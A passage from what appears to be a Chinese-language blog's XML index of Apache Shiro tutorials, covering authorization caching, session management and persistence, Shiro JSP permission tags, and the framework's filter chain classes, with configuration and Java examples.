subject().checkRole(r1.getRole()); userService.correlationRoles(u1.getId(), r2.getId()); RealmSecurityManager securityManager = (RealmSecurityManager) SecurityUtils.getSecurityManager(); UserRealm userRealm = (UserRealm)securityManager.getRealms().iterator().next(); userRealm.clearCachedAuthorizationInfo(subject().getPrincipals()); subject().checkRole(r2.getRole());&#125;&amp;nbsp; 和之前的用例差不多；此处调用 Realm 的 clearCachedAuthorizationInfo 清空之前缓存的 AuthorizationInfo； 另外还有 clearCache，其同时调用 clearCachedAuthenticationInfo 和 clearCachedAuthorizationInfo，清空 AuthenticationInfo 和 AuthorizationInfo。 UserRealm 还提供了 clearAllCachedAuthorizationInfo、clearAllCachedAuthenticationInfo、clearAllCache，用于清空整个缓存。 在某些清空下这种方式可能不是最好的选择，可以考虑直接废弃 Shiro 的缓存，然后自己通过如 AOP 机制实现自己的缓存；可以参考：https://github.com/zhangkaitao/es/tree/master/web/src/main/java/com/sishuok/es/extra/aop 另外如果和 Spring 集成时可以考虑直接使用 Spring 的 Cache 抽象，可以考虑使用 SpringCacheManagerWrapper，其对 Spring Cache 进行了包装，转换为 Shiro 的 CacheManager 实现：https://github.com/zhangkaitao/es/blob/master/web/src/main/java/org/apache/shiro/cache/spring/SpringCacheManagerWrapper.java Session 缓存当我们设置了 SecurityManager 的 CacheManager 时，如： 1securityManager.cacheManager=$cacheManager 当我们设置 SessionManager 时： 12sessionManager=org.apache.shiro.session.mgt.DefaultSessionManagersecurityManager.sessionManager=$sessionManager&amp;nbsp; 如 securityManager 实现了 SessionsSecurityManager，其会自动判断 SessionManager 是否实现了 CacheManagerAware 接口，如果实现了会把 CacheManager 设置给它。然后 sessionManager 会判断相应的 sessionDAO（如继承自 CachingSessionDAO）是否实现了 CacheManagerAware，如果实现了会把 CacheManager 设置给它；如第九章的 MySessionDAO 就是带缓存的 SessionDAO；其会先查缓存，如果找不到才查数据库。 对于 CachingSessionDAO，可以通过如下配置设置缓存的名称： 12sessionDAO=com.github.zhangkaitao.shiro.chapter11.session.dao.MySessionDAOsessionDAO.activeSessionsCacheName=shiro-activeSessionCache&amp;nbsp; activeSessionsCacheName 默认就是 shiro-activeSessionCache。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[会话管理]]></title>
    <url>%2F2018%2F10%2F05%2F%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[会话管理Shiro 提供了完整的企业级会话管理功能，不依赖于底层容器（如 web 容器 tomcat），不管 JavaSE 还是 JavaEE 环境都可以使用，提供了会话管理、会话事件监听、会话存储 / 持久化、容器无关的集群、失效 / 过期支持、对 Web 的透明支持、SSO 单点登录的支持等特性。即直接使用 Shiro 的会话管理可以直接替换如 Web 容器的会话管理。 会话所谓会话，即用户访问应用时保持的连接关系，在多次交互中应用能够识别出当前访问的用户是谁，且可以在多次交互中保存一些数据。如访问一些网站时登录成功后，网站可以记住用户，且在退出之前都可以识别当前用户是谁。 Shiro 的会话支持不仅可以在普通的 JavaSE 应用中使用，也可以在 JavaEE 应用中使用，如 web 应用。且使用方式是一致的。 123login(&quot;classpath:shiro.ini&quot;, &quot;zhang&quot;, &quot;123&quot;);Subject subject = SecurityUtils.getSubject();Session session = subject.getSession();&amp;nbsp; 登录成功后使用 Subject.getSession() 即可获取会话；其等价于 Subject.getSession(true)，即如果当前没有创建 Session 对象会创建一个；另外 Subject.getSession(false)，如果当前没有创建 Session 则返回 null（不过默认情况下如果启用会话存储功能的话在创建 Subject 时会主动创建一个 Session）。 1session.getId(); 获取当前会话的唯一标识。 1session.getHost(); 获取当前 Subject 的主机地址，该地址是通过 HostAuthenticationToken.getHost() 提供的。 12session.getTimeout();session.setTimeout(毫秒);&amp;nbsp; 获取 / 设置当前 Session 的过期时间；如果不设置默认是会话管理器的全局过期时间。 12session.getStartTimestamp();session.getLastAccessTime(); 获取会话的启动时间及最后访问时间；如果是 JavaSE 应用需要自己定期调用 session.touch() 去更新最后访问时间；如果是 Web 应用，每次进入 ShiroFilter 都会自动调用 session.touch() 来更新最后访问时间。 12session.touch();session.stop();&amp;nbsp; 更新会话最后访问时间及销毁会话；当 Subject.logout() 时会自动调用 stop 方法来销毁会话。如果在 web 中，调用 javax.servlet.http.HttpSession. invalidate() 也会自动调用 Shiro Session.stop 方法进行销毁 Shiro 的会话。 123session.setAttribute(&quot;key&quot;, &quot;123&quot;);Assert.assertEquals(&quot;123&quot;, session.getAttribute(&quot;key&quot;));session.removeAttribute(&quot;key&quot;); 设置 / 获取 / 删除会话属性；在整个会话范围内都可以对这些属性进行操作。 Shiro 提供的会话可以用于 JavaSE/JavaEE 环境，不依赖于任何底层容器，可以独立使用，是完整的会话模块。 会话管理器会话管理器管理着应用中所有 Subject 的会话的创建、维护、删除、失效、验证等工作。是 Shiro 的核心组件，顶层组件 SecurityManager 直接继承了 SessionManager，且提供了SessionsSecurityManager 实现直接把会话管理委托给相应的 SessionManager，DefaultSecurityManager 及 DefaultWebSecurityManager 默认 SecurityManager 都继承了 SessionsSecurityManager。 SecurityManager 提供了如下接口： 12Session start(SessionContext context); //启动会话Session getSession(SessionKey key) throws SessionException; //根据会话Key获取会话&amp;nbsp; 另外用于 Web 环境的 WebSessionManager 又提供了如下接口： 1boolean isServletContainerSessions();// 是否使用 Servlet 容器的会话 Shiro 还提供了 ValidatingSessionManager 用于验资并过期会话： 1void validateSessions();// 验证所有会话是否过期 Shiro 提供了三个默认实现： DefaultSessionManager：DefaultSecurityManager 使用的默认实现，用于 JavaSE 环境；ServletContainerSessionManager：DefaultWebSecurityManager 使用的默认实现，用于 Web 环境，其直接使用 Servlet 容器的会话；DefaultWebSessionManager：用于 Web 环境的实现，可以替代 ServletContainerSessionManager，自己维护着会话，直接废弃了 Servlet 容器的会话管理。 替换 SecurityManager 默认的 SessionManager 可以在 ini 中配置（shiro.ini）： 123[main]sessionManager=org.apache.shiro.session.mgt.DefaultSessionManagersecurityManager.sessionManager=$sessionManager&amp;nbsp; Web 环境下的 ini 配置 (shiro-web.ini)： 1234&lt;!--EndFragment--&gt;[main]sessionManager=org.apache.shiro.web.session.mgt.ServletContainerSessionManagersecurityManager.sessionManager=$sessionManager 另外可以设置会话的全局过期时间（毫秒为单位），默认 30 分钟： 1sessionManager. globalSessionTimeout=1800000 默认情况下 globalSessionTimeout 将应用给所有 Session。可以单独设置每个 Session 的 timeout 属性来为每个 Session 设置其超时时间。 另外如果使用 ServletContainerSessionManager 进行会话管理，Session 的超时依赖于底层 Servlet 容器的超时时间，可以在 web.xml 中配置其会话的超时时间（分钟为单位）： 123&lt;session-config&gt; &lt;session-timeout&gt;30&lt;/session-timeout&gt;&lt;/session-config&gt; 在 Servlet 容器中，默认使用 JSESSIONID Cookie 维护会话，且会话默认是跟容器绑定的；在某些情况下可能需要使用自己的会话机制，此时我们可以使用 DefaultWebSessionManager 来维护会话： 12345678910sessionIdCookie=org.apache.shiro.web.servlet.SimpleCookiesessionManager=org.apache.shiro.web.session.mgt.DefaultWebSessionManagersessionIdCookie.name=sid\#sessionIdCookie.domain=sishuok.com\#sessionIdCookie.path=sessionIdCookie.maxAge=1800sessionIdCookie.httpOnly=truesessionManager.sessionIdCookie=$sessionIdCookiesessionManager.sessionIdCookieEnabled=truesecurityManager.sessionManager=$sessionManager&amp;nbsp; sessionIdCookie 是 sessionManager 创建会话 Cookie 的模板： sessionIdCookie.name：设置 Cookie 名字，默认为 JSESSIONID； sessionIdCookie.domain：设置 Cookie 的域名，默认空，即当前访问的域名； sessionIdCookie.path：设置 Cookie 的路径，默认空，即存储在域名根下； sessionIdCookie.maxAge：设置 Cookie 的过期时间，秒为单位，默认 - 1 表示关闭浏览器时过期 Cookie； sessionIdCookie.httpOnly：如果设置为 true，则客户端不会暴露给客户端脚本代码，使用 HttpOnly cookie 有助于减少某些类型的跨站点脚本攻击；此特性需要实现了 Servlet 2.5 MR6 及以上版本的规范的 Servlet 容器支持； sessionManager.sessionIdCookieEnabled：是否启用 / 禁用 Session Id Cookie，默认是启用的；如果禁用后将不会设置 Session Id Cookie，即默认使用了 Servlet 容器的 JSESSIONID，且通过 URL 重写（URL 中的 “;JSESSIONID=id” 部分）保存 Session Id。 另外我们可以如 “sessionManager. sessionIdCookie.name=sid” 这种方式操作 Cookie 模板。 会话监听器会话监听器用于监听会话创建、过期及停止事件： 1234567891011121314public class MySessionListener1 implements SessionListener &#123; @Override public void onStart(Session session) &#123;//会话创建时触发 System.out.println(&quot;会话创建：&quot; + session.getId()); &#125; @Override public void onExpiration(Session session) &#123;//会话过期时触发 System.out.println(&quot;会话过期：&quot; + session.getId()); &#125; @Override public void onStop(Session session) &#123;//退出/会话过期时触发 System.out.println(&quot;会话停止：&quot; + session.getId()); &#125; &#125; 如果只想监听某一个事件，可以继承 SessionListenerAdapter 实现： 123456public class MySessionListener2 extends SessionListenerAdapter &#123; @Override public void onStart(Session session) &#123; System.out.println(&quot;会话创建：&quot; + session.getId()); &#125;&#125; 在 shiro-web.ini 配置文件中可以进行如下配置设置会话监听器： 123sessionListener1=com.github.zhangkaitao.shiro.chapter10.web.listener.MySessionListener1sessionListener2=com.github.zhangkaitao.shiro.chapter10.web.listener.MySessionListener2sessionManager.sessionListeners=$sessionListener1,$sessionListener2 会话存储 / 持久化Shiro 提供 SessionDAO 用于会话的 CRUD，即 DAO（Data Access Object）模式实现： 12345678910//如DefaultSessionManager在创建完session后会调用该方法；如保存到关系数据库/文件系统/NoSQL数据库；即可以实现会话的持久化；返回会话ID；主要此处返回的ID.equals(session.getId())；Serializable create(Session session);//根据会话ID获取会话Session readSession(Serializable sessionId) throws UnknownSessionException;//更新会话；如更新会话最后访问时间/停止会话/设置超时时间/设置移除属性等会调用void update(Session session) throws UnknownSessionException;//删除会话；当会话过期/会话停止（如用户退出时）会调用void delete(Session session);//获取当前所有活跃用户，如果用户量多此方法影响性能Collection&lt;Session&gt; getActiveSessions();&amp;nbsp; Shiro 内嵌了如下 SessionDAO 实现： AbstractSessionDAO 提供了 SessionDAO 的基础实现，如生成会话 ID 等；CachingSessionDAO 提供了对开发者透明的会话缓存的功能，只需要设置相应的 CacheManager 即可；MemorySessionDAO 直接在内存中进行会话维护；而 EnterpriseCacheSessionDAO 提供了缓存功能的会话维护，默认情况下使用 MapCache 实现，内部使用 ConcurrentHashMap 保存缓存的会话。 可以通过如下配置设置 SessionDAO： 12sessionDAO=org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAOsessionManager.sessionDAO=$sessionDAO&amp;nbsp; Shiro 提供了使用 Ehcache 进行会话存储，Ehcache 可以配合 TerraCotta 实现容器无关的分布式集群。 首先在 pom.xml 里添加如下依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-ehcache&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt;&lt;/dependency&gt;&amp;nbsp; 接着配置 shiro-web.ini 文件： 123456sessionDAO=org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAOsessionDAO. activeSessionsCacheName=shiro-activeSessionCachesessionManager.sessionDAO=$sessionDAOcacheManager = org.apache.shiro.cache.ehcache.EhCacheManagercacheManager.cacheManagerConfigFile=classpath:ehcache.xmlsecurityManager.cacheManager = $cacheManager&amp;nbsp; sessionDAO. activeSessionsCacheName：设置 Session 缓存名字，默认就是 shiro-activeSessionCache； cacheManager：缓存管理器，用于管理缓存的，此处使用 Ehcache 实现； cacheManager.cacheManagerConfigFile：设置 ehcache 缓存的配置文件； securityManager.cacheManager：设置 SecurityManager 的 cacheManager，会自动设置实现了 CacheManagerAware 接口的相应对象，如 SessionDAO 的 cacheManager； 然后配置 ehcache.xml： 12345678&lt;cache name=&quot;shiro-activeSessionCache&quot; maxEntriesLocalHeap=&quot;10000&quot; overflowToDisk=&quot;false&quot; eternal=&quot;false&quot; diskPersistent=&quot;false&quot; timeToLiveSeconds=&quot;0&quot; timeToIdleSeconds=&quot;0&quot; statistics=&quot;true&quot;/&gt;&amp;nbsp; Cache 的名字为 shiro-activeSessionCache，即设置的 sessionDAO 的 activeSessionsCacheName 属性值。 另外可以通过如下 ini 配置设置会话 ID 生成器： 12sessionIdGenerator=org.apache.shiro.session.mgt.eis.JavaUuidSessionIdGeneratorsessionDAO.sessionIdGenerator=$sessionIdGenerator&amp;nbsp; 用于生成会话 ID，默认就是 JavaUuidSessionIdGenerator，使用 java.util.UUID 生成。 如果自定义实现 SessionDAO，继承 CachingSessionDAO 即可： 123456789101112131415161718192021222324252627public class MySessionDAO extends CachingSessionDAO &#123; private JdbcTemplate jdbcTemplate = JdbcTemplateUtils.jdbcTemplate(); protected Serializable doCreate(Session session) &#123; Serializable sessionId = generateSessionId(session); assignSessionId(session, sessionId); String sql = &quot;insert into sessions(id, session) values(?,?)&quot;; jdbcTemplate.update(sql, sessionId, SerializableUtils.serialize(session)); return session.getId(); &#125;protected void doUpdate(Session session) &#123; if(session instanceof ValidatingSession &amp;&amp; !((ValidatingSession)session).isValid()) &#123; return; //如果会话过期/停止 没必要再更新了 &#125; String sql = &quot;update sessions set session=? where id=?&quot;; jdbcTemplate.update(sql, SerializableUtils.serialize(session), session.getId()); &#125; protected void doDelete(Session session) &#123; String sql = &quot;delete from sessions where id=?&quot;; jdbcTemplate.update(sql, session.getId()); &#125; protected Session doReadSession(Serializable sessionId) &#123; String sql = &quot;select session from sessions where id=?&quot;; List&lt;String&gt; sessionStrList = jdbcTemplate.queryForList(sql, String.class, sessionId); if(sessionStrList.size() == 0) return null; return SerializableUtils.deserialize(sessionStrList.get(0)); &#125;&#125;&amp;nbsp; doCreate/doUpdate/doDelete/doReadSession 分别代表创建 / 修改 / 删除 / 读取会话；此处通过把会话序列化后存储到数据库实现；接着在 shiro-web.ini 中配置： 1sessionDAO=com.github.zhangkaitao.shiro.chapter10.session.dao.MySessionDAO 其他设置和之前一样，因为继承了 CachingSessionDAO；所有在读取时会先查缓存中是否存在，如果找不到才到数据库中查找。 会话验证Shiro 提供了会话验证调度器，用于定期的验证会话是否已过期，如果过期将停止会话；出于性能考虑，一般情况下都是获取会话时来验证会话是否过期并停止会话的；但是如在 web 环境中，如果用户不主动退出是不知道会话是否过期的，因此需要定期的检测会话是否过期，Shiro 提供了会话验证调度器 SessionValidationScheduler 来做这件事情。 可以通过如下 ini 配置开启会话验证： 123456sessionValidationScheduler=org.apache.shiro.session.mgt.ExecutorServiceSessionValidationSchedulersessionValidationScheduler.interval = 3600000sessionValidationScheduler.sessionManager=$sessionManagersessionManager.globalSessionTimeout=1800000sessionManager.sessionValidationSchedulerEnabled=truesessionManager.sessionValidationScheduler=$sessionValidationScheduler&amp;nbsp; sessionValidationScheduler：会话验证调度器，sessionManager 默认就是使用 ExecutorServiceSessionValidationScheduler，其使用 JDK 的 ScheduledExecutorService 进行定期调度并验证会话是否过期； sessionValidationScheduler.interval：设置调度时间间隔，单位毫秒，默认就是 1 小时； sessionValidationScheduler.sessionManager：设置会话验证调度器进行会话验证时的会话管理器； sessionManager.globalSessionTimeout：设置全局会话超时时间，默认 30 分钟，即如果 30 分钟内没有访问会话将过期； sessionManager.sessionValidationSchedulerEnabled：是否开启会话验证器，默认是开启的； sessionManager.sessionValidationScheduler：设置会话验证调度器，默认就是使用 ExecutorServiceSessionValidationScheduler。 Shiro 也提供了使用 Quartz 会话验证调度器： 123sessionValidationScheduler=org.apache.shiro.session.mgt.quartz.QuartzSessionValidationSchedulersessionValidationScheduler.sessionValidationInterval = 3600000sessionValidationScheduler.sessionManager=$sessionManager&amp;nbsp; 使用时需要导入 shiro-quartz 依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-quartz&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt;&lt;/dependency&gt; 如上会话验证调度器实现都是直接调用 AbstractValidatingSessionManager 的 validateSessions 方法进行验证，其直接调用 SessionDAO 的 getActiveSessions 方法获取所有会话进行验证，如果会话比较多，会影响性能；可以考虑如分页获取会话并进行验证，如 com.github.zhangkaitao.shiro.chapter10.session.scheduler.MySessionValidationScheduler： 12345678910111213141516171819202122//分页获取会话并验证String sql = &quot;select session from sessions limit ?,?&quot;;int start = 0; //起始记录int size = 20; //每页大小List&lt;String&gt; sessionList = jdbcTemplate.queryForList(sql, String.class, start, size);while(sessionList.size() &gt; 0) &#123; for(String sessionStr : sessionList) &#123; try &#123; Session session = SerializableUtils.deserialize(sessionStr); Method validateMethod = ReflectionUtils.findMethod(AbstractValidatingSessionManager.class, &quot;validate&quot;, Session.class, SessionKey.class); validateMethod.setAccessible(true); ReflectionUtils.invokeMethod(validateMethod, sessionManager, session, new DefaultSessionKey(session.getId())); &#125; catch (Exception e) &#123; //ignore &#125; &#125; start = start + size; sessionList = jdbcTemplate.queryForList(sql, String.class, start, size);&#125;&amp;nbsp; 其直接改造自 ExecutorServiceSessionValidationScheduler，如上代码是验证的核心代码，可以根据自己的需求改造此验证调度器器；ini 的配置和之前的类似。 如果在会话过期时不想删除过期的会话，可以通过如下 ini 配置进行设置： 1sessionManager.deleteInvalidSessions=false 默认是开启的，在会话过期后会调用 SessionDAO 的 delete 方法删除会话：如会话时持久化存储的，可以调用此方法进行删除。 如果是在获取会话时验证了会话已过期，将抛出 InvalidSessionException；因此需要捕获这个异常并跳转到相应的页面告诉用户会话已过期，让其重新登录，如可以在 web.xml 配置相应的错误页面： 1234&lt;error-page&gt; &lt;exception-type&gt;org.apache.shiro.session.InvalidSessionException&lt;/exception-type&gt; &lt;location&gt;/invalidSession.jsp&lt;/location&gt;&lt;/error-page&gt; sessionFactorysessionFactory 是创建会话的工厂，根据相应的 Subject 上下文信息来创建会话；默认提供了 SimpleSessionFactory 用来创建 SimpleSession 会话。 首先自定义一个 Session： 12345678910111213141516public class OnlineSession extends SimpleSession &#123; public static enum OnlineStatus &#123; on_line(&quot;在线&quot;), hidden(&quot;隐身&quot;), force_logout(&quot;强制退出&quot;); private final String info; private OnlineStatus(String info) &#123; this.info = info; &#125; public String getInfo() &#123; return info; &#125; &#125; private String userAgent; //用户浏览器类型 private OnlineStatus status = OnlineStatus.on_line; //在线状态 private String systemHost; //用户登录时系统IP //省略其他&#125;&amp;nbsp; OnlineSession 用于保存当前登录用户的在线状态，支持如离线等状态的控制。 接着自定义 SessionFactory： 12345678910111213141516public class OnlineSessionFactory implements SessionFactory &#123; @Override public Session createSession(SessionContext initData) &#123; OnlineSession session = new OnlineSession(); if (initData != null &amp;&amp; initData instanceof WebSessionContext) &#123; WebSessionContext sessionContext = (WebSessionContext) initData; HttpServletRequest request = (HttpServletRequest) sessionContext.getServletRequest(); if (request != null) &#123; session.setHost(IpUtils.getIpAddr(request)); session.setUserAgent(request.getHeader(&quot;User-Agent&quot;)); session.setSystemHost(request.getLocalAddr() + &quot;:&quot; + request.getLocalPort()); &#125; &#125; return session; &#125;&#125;&amp;nbsp; 根据会话上下文创建相应的 OnlineSession。 最后在 shiro-web.ini 配置文件中配置： 12sessionFactory=org.apache.shiro.session.mgt.OnlineSessionFactorysessionManager.sessionFactory=$sessionFactory]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>会话管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSP标签]]></title>
    <url>%2F2018%2F10%2F03%2FJSP%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[JSP 标签Shiro 提供了 JSTL 标签用于在 JSP/GSP 页面进行权限控制，如根据登录用户显示相应的页面按钮。 导入标签库 1&lt;%@taglib prefix=&quot;shiro&quot; uri=&quot;http://shiro.apache.org/tags&quot; %&gt; 标签库定义在 shiro-web.jar 包下的 META-INF/shiro.tld 中定义。 guest 标签 123&lt;shiro:guest&gt;欢迎游客访问，&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/login.jsp&quot;&gt;登录&lt;/a&gt;&lt;/shiro:guest&gt;&amp;nbsp; 用户没有身份验证时显示相应信息，即游客访问信息。 user 标签 123&lt;shiro:guest&gt;欢迎游客访问，&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/login.jsp&quot;&gt;登录&lt;/a&gt;&lt;/shiro:guest&gt;&amp;nbsp; 用户已经身份验证 / 记住我登录后显示相应的信息。 authenticated 标签 123&lt;shiro:authenticated&gt; 用户[&lt;shiro:principal/&gt;]已身份验证通过&lt;/shiro:authenticated&gt;&amp;nbsp; 用户已经身份验证通过，即 Subject.login 登录成功，不是记住我登录的。 notAuthenticated 标签 123&lt;shiro:notAuthenticated&gt; 未身份验证（包括记住我）&lt;/shiro:notAuthenticated&gt; 用户已经身份验证通过，即没有调用 Subject.login 进行登录，包括记住我自动登录的也属于未进行身份验证。 principal 标签 1&lt;shiro: principal/&gt; 显示用户身份信息，默认调用 Subject.getPrincipal() 获取，即 Primary Principal。 1&lt;shiro:principal type=&quot;java.lang.String&quot;/&gt; 相当于 Subject.getPrincipals().oneByType(String.class)。 1&lt;shiro:principal type=&quot;java.lang.String&quot;/&gt; 相当于 Subject.getPrincipals().oneByType(String.class)。 1&lt;shiro:principal property=&quot;username&quot;/&gt; 相当于 ((User)Subject.getPrincipals()).getUsername()。 hasRole 标签 123&lt;shiro:hasRole name=&quot;admin&quot;&gt; 用户[&lt;shiro:principal/&gt;]拥有角色admin&lt;br/&gt;&lt;/shiro:hasRole&gt;&amp;nbsp; 如果当前 Subject 有角色将显示 body 体内容。 hasAnyRoles 标签 123&lt;shiro:hasAnyRoles name=&quot;admin,user&quot;&gt; 用户[&lt;shiro:principal/&gt;]拥有角色admin或user&lt;br/&gt;&lt;/shiro:hasAnyRoles&gt;&amp;nbsp; 如果当前 Subject 有任意一个角色（或的关系）将显示 body 体内容。 lacksRole 标签 123&lt;shiro:lacksRole name=&quot;abc&quot;&gt; 用户[&lt;shiro:principal/&gt;]没有角色abc&lt;br/&gt;&lt;/shiro:lacksRole&gt;&amp;nbsp; 如果当前 Subject 没有角色将显示 body 体内容。 hasPermission 标签 123&lt;shiro:hasPermission name=&quot;user:create&quot;&gt; 用户[&lt;shiro:principal/&gt;]拥有权限user:create&lt;br/&gt;&lt;/shiro:hasPermission&gt;&amp;nbsp; 如果当前 Subject 有权限将显示 body 体内容。 lacksPermission 标签 123&lt;shiro:lacksPermission name=&quot;org:create&quot;&gt; 用户[&lt;shiro:principal/&gt;]没有权限org:create&lt;br/&gt;&lt;/shiro:lacksPermission&gt;&amp;nbsp; 如果当前 Subject 没有权限将显示 body 体内容。 另外又提供了几个权限控制相关的标签： 导入自定义标签库 1&lt;%@taglib prefix=&quot;zhang&quot; tagdir=&quot;/WEB-INF/tags&quot; %&gt; 示例 123456789&lt;zhang:hasAllRoles name=&quot;admin,user&quot;&gt; 用户[&lt;shiro:principal/&gt;]拥有角色admin和user&lt;br/&gt;&lt;/zhang:hasAllRoles&gt;&lt;zhang:hasAllPermissions name=&quot;user:create,user:update&quot;&gt; 用户[&lt;shiro:principal/&gt;]拥有权限user:create和user:update&lt;br/&gt;&lt;/zhang:hasAllPermissions&gt;&lt;zhang:hasAnyPermissions name=&quot;user:create,abc:update&quot;&gt; 用户[&lt;shiro:principal/&gt;]拥有权限user:create或abc:update&lt;br/&gt;&lt;/zhang:hasAnyPermissions&gt;&amp;nbsp; hasAllRoles 表示拥有所有相关的角色；hasAllPermissions 表示拥有所有相关的权限；hasAnyPermissions 表示拥有任意一个相关的权限。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>JSP标签</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[拦截器机制]]></title>
    <url>%2F2018%2F10%2F01%2F%E6%8B%A6%E6%88%AA%E5%99%A8%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[拦截器机制拦截器介绍Shiro 使用了与 Servlet 一样的 Filter 接口进行扩展；所以如果对 Filter 不熟悉可以参考《Servlet 3.1 规范》http://www.iteye.com/blogs/subjects/Servlet-3-1了解 Filter 的工作原理。首先下图是 Shiro 拦截器的基础类图： 1、NameableFilterNameableFilter 给 Filter 起个名字，如果没有设置默认就是 FilterName；还记得之前的如 authc 吗？当我们组装拦截器链时会根据这个名字找到相应的拦截器实例； 2、OncePerRequestFilterOncePerRequestFilter 用于防止多次执行 Filter 的；也就是说一次请求只会走一次拦截器链；另外提供 enabled 属性，表示是否开启该拦截器实例，默认 enabled=true 表示开启，如果不想让某个拦截器工作，可以设置为 false 即可。 3、ShiroFilterShiroFilter 是整个 Shiro 的入口点，用于拦截需要安全控制的请求进行处理，这个之前已经用过了。 4、AdviceFilterAdviceFilter 提供了 AOP 风格的支持，类似于 SpringMVC 中的 Interceptor： 123boolean preHandle(ServletRequest request, ServletResponse response) throws Exceptionvoid postHandle(ServletRequest request, ServletResponse response) throws Exceptionvoid afterCompletion(ServletRequest request, ServletResponse response, Exception exception) throws Exception;&amp;nbsp; preHandler：类似于 AOP 中的前置增强；在拦截器链执行之前执行；如果返回 true 则继续拦截器链；否则中断后续的拦截器链的执行直接返回；进行预处理（如基于表单的身份验证、授权） postHandle：类似于 AOP 中的后置返回增强；在拦截器链执行完成后执行；进行后处理（如记录执行时间之类的）； afterCompletion：类似于 AOP 中的后置最终增强；即不管有没有异常都会执行；可以进行清理资源（如接触 Subject 与线程的绑定之类的）； 5、PathMatchingFilter PathMatchingFilter 提供了基于 Ant 风格的请求路径匹配功能及拦截器参数解析的功能，如“roles[admin,user]”自动根据“，”分割解析到一个路径参数配置并绑定到相应的路径： 12boolean pathsMatch(String path, ServletRequest request)boolean onPreHandle(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception&amp;nbsp; pathsMatch：该方法用于 path 与请求路径进行匹配的方法；如果匹配返回 true；onPreHandle：在 preHandle 中，当 pathsMatch 匹配一个路径后，会调用 opPreHandler 方法并将路径绑定参数配置传给 mappedValue；然后可以在这个方法中进行一些验证（如角色授权），如果验证失败可以返回 false 中断流程；默认返回 true；也就是说子类可以只实现 onPreHandle 即可，无须实现 preHandle。如果没有 path 与请求路径匹配，默认是通过的（即 preHandle 返回 true）。 6、AccessControlFilter AccessControlFilter 提供了访问控制的基础功能；比如是否允许访问/当访问拒绝时如何处理等： 123abstract boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception;boolean onAccessDenied(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception;abstract boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception;&amp;nbsp; isAccessAllowed：表示是否允许访问；mappedValue 就是[urls]配置中拦截器参数部分，如果允许访问返回 true，否则 false； onAccessDenied：表示当访问拒绝时是否已经处理了；如果返回 true 表示需要继续处理；如果返回 false 表示该拦截器实例已经处理了，将直接返回即可。 onPreHandle 会自动调用这两个方法决定是否继续处理： 123boolean onPreHandle(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; return isAccessAllowed(request, response, mappedValue) || onAccessDenied(request, response, mappedValue);&#125;&amp;nbsp; 另外 AccessControlFilter 还提供了如下方法用于处理如登录成功后/重定向到上一个请求： 1234567void setLoginUrl(String loginUrl) //身份验证时使用，默认/login.jspString getLoginUrl()Subject getSubject(ServletRequest request, ServletResponse response) //获取Subject 实例boolean isLoginRequest(ServletRequest request, ServletResponse response)//当前请求是否是登录请求void saveRequestAndRedirectToLogin(ServletRequest request, ServletResponse response) throws IOException //将当前请求保存起来并重定向到登录页面void saveRequest(ServletRequest request) //将请求保存起来，如登录成功后再重定向回该请求void redirectToLogin(ServletRequest request, ServletResponse response) //重定向到登录页面&amp;nbsp; 比如基于表单的身份验证就需要使用这些功能。 到此基本的拦截器就完事了，如果我们想进行访问访问的控制就可以继承 AccessControlFilter；如果我们要添加一些通用数据我们可以直接继承 PathMatchingFilter。 拦截器链Shiro 对 Servlet 容器的 FilterChain 进行了代理，即 ShiroFilter 在继续 Servlet 容器的 Filter 链的执行之前，通过 ProxiedFilterChain 对 Servlet 容器的 FilterChain 进行了代理；即先走 Shiro 自己的 Filter 体系，然后才会委托给 Servlet 容器的 FilterChain 进行 Servlet 容器级别的 Filter 链执行；Shiro 的 ProxiedFilterChain 执行流程：1、先执行 Shiro 自己的 Filter 链；2、再执行 Servlet 容器的 Filter 链（即原始的 Filter）。 而 ProxiedFilterChain 是通过 FilterChainResolver 根据配置文件中[urls]部分是否与请求的 URL 是否匹配解析得到的。 1FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain); 即传入原始的 chain 得到一个代理的 chain。 Shiro 内部提供了一个路径匹配的 FilterChainResolver 实现：PathMatchingFilterChainResolver，其根据[urls]中配置的 url 模式（默认 Ant 风格）=拦截器链和请求的 url 是否匹配来解析得到配置的拦截器链的；而 PathMatchingFilterChainResolver 内部通过 FilterChainManager 维护着拦截器链，比如 DefaultFilterChainManager 实现维护着 url 模式与拦截器链的关系。因此我们可以通过 FilterChainManager 进行动态动态增加 url 模式与拦截器链的关系。 DefaultFilterChainManager 会默认添加 org.apache.shiro.web.filter.mgt.DefaultFilter 中声明的拦截器： 12345678910111213public enum DefaultFilter &#123; anon(AnonymousFilter.class), authc(FormAuthenticationFilter.class), authcBasic(BasicHttpAuthenticationFilter.class), logout(LogoutFilter.class), noSessionCreation(NoSessionCreationFilter.class), perms(PermissionsAuthorizationFilter.class), port(PortFilter.class), rest(HttpMethodPermissionFilter.class), roles(RolesAuthorizationFilter.class), ssl(SslFilter.class), user(UserFilter.class);&#125;&amp;nbsp; 下一节会介绍这些拦截器的作用。 如果要注册自定义拦截器，IniSecurityManagerFactory/WebIniSecurityManagerFactory 在启动时会自动扫描 ini 配置文件中的 [filters]/[main] 